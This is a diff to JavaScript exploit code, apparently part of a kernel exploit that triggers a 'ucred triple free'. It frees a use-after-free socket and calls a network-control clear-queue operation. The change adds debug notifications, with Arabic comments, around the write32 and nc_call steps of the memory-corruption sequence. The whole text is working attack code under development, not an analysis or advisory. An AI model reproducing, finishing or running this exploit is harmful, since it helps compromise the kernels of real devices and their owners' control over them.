@@ -1496,7 +1496,7 @@ function trigger_ucred_triplefree() {
       continue;
     }
     send_notification("[T] tmp_sock_type=" + typeof tmp_sock);
-send_notification("[T] tmp_sock_value=" + tmp_sock.toString());
+    send_notification("[T] tmp_sock_value=" + tmp_sock.toString());
     uaf_socket = Number(tmp_sock.and(0xFFFFFFFF));
 
     // 4) free previous ucred
@@ -1507,10 +1507,22 @@ send_notification("[T] tmp_sock_value=" + tmp_sock.toString());
 
     // 5) unregister → free file + ucred
     send_notification("[T] before_clear_queue");
-    write32(nc_clear_buf, uaf_socket);
-    nc_call(NET_CONTROL_NETEVENT_CLEAR_QUEUE, nc_clear_buf, 8);
-    send_notification("[T] after_clear_queue");
 
+    // قيمة fd اللي داخل
+    send_notification("[T] clear_queue_uaf_socket=" + uaf_socket);
+
+    // قبل الكتابة
+    send_notification("[T] before_write32_clear");
+    write32(nc_clear_buf, uaf_socket);
+    send_notification("[T] after_write32_clear");
+
+    // قبل nc_call
+    send_notification("[T] before_nc_call_clear");
+    nc_call(NET_CONTROL_NETEVENT_CLEAR_QUEUE, nc_clear_buf, 8);
+    send_notification("[T] after_nc_call_clear");
+
+    // بعد العملية كلها
+    send_notification("[T] after_clear_queue");
 
     // 6) refcount fix loop
     send_notification("[T] before_refcount_fix");
